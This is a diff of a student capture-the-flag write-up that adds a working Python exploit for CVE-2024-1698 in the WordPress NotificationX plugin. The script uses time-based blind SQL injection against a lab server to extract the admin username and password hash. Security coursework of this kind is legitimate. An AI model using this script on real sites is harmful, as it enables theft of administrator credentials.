@@ -13,8 +13,77 @@ After that, we did some research to find any vulnerabilities in that plugins rel
 We found **CVE-2024-1698** on **WordPress NotificationX** .
 
 
-After some research in the website, we found the comment: 
+By searching for the CVE exploit, we found this exploit script, which we adapted to our website:
 
-![Image 2](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF8_img2.png)
+```
+import requests
+import string
+from sys import exit
 
-We now know that the website uses WordPress Password Hashing (using phppass).
+# Sleep time for SQL payloads
+delay = 0.3
+
+# URL for the NotificationX Analytics API
+url = "http://44.242.216.18:5008//wp-json/notificationx/v1/analytics"
+
+admin_username = ""
+admin_password_hash = ""
+
+session = requests.Session()
+
+# Find admin username length
+username_length = 0
+for length in range(1, 41):  # Assuming username length is less than 40 characters
+    resp_length = session.post(url, data={
+        "nx_id": 1337,
+        "type": f"clicks`=IF(LENGTH((select user_login from wp_users where id=1))={length},SLEEP({delay}),null)-- -"
+    })
+
+    # Elapsed time > delay if delay happened due to SQLi
+    if resp_length.elapsed.total_seconds() > delay:
+        username_length = length
+        print("Admin username length:", username_length)
+        break
+
+# Find admin username
+for idx_username in range(1, username_length + 1):
+    # Iterate over all the printable characters + NULL byte
+    for ascii_val_username in (b"\x00" + string.printable.encode()):
+        # Send the payload
+        resp_username = session.post(url, data={
+            "nx_id": 1337,
+            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_login from wp_users where id=1),{idx_username},1))={ascii_val_username},SLEEP({delay}),null)-- -"
+        })
+
+        # Elapsed time > delay if delay happened due to SQLi
+        if resp_username.elapsed.total_seconds() > delay:
+            admin_username += chr(ascii_val_username)
+            # Show what we have found so far...
+            print("Admin username:", admin_username)
+            break  # Move to the next character
+    else:
+        # Null byte reached, break the outer loop
+        break
+
+# Find admin password hash
+for idx_password in range(1, 41):  # Assuming the password hash length is less than 40 characters
+    # Iterate over all the printable characters + NULL byte
+    for ascii_val_password in (b"\x00" + string.printable.encode()):
+        # Send the payload
+        resp_password = session.post(url, data={
+            "nx_id": 1337,
+            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),{idx_password},1))={ascii_val_password},SLEEP({delay}),null)-- -"
+        })
+
+        # Elapsed time > delay if delay happened due to SQLi
+        if resp_password.elapsed.total_seconds() > delay:
+            admin_password_hash += chr(ascii_val_password)
+            # Show what we have found so far...
+            print("Admin password hash:", admin_password_hash)
+            # Exit condition - encountered a null byte
+            if ascii_val_password == 0:
+                print("[*] Admin credentials found:")
+                print("Username:", admin_username)
+                print("Password hash:", admin_password_hash)
+                exit(0)
+```
